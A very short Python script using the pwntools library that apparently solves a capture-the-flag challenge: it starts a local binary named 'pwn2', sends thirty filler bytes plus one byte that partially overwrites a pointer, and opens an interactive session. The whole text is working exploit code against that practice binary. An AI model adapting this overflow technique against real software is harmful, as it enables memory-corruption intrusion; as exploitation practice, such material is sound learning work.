from pwn import *

target = process('./pwn2')

payload = b'\x30' * 30
payload += b'\xd8'

target.sendline(payload)

target.interactive()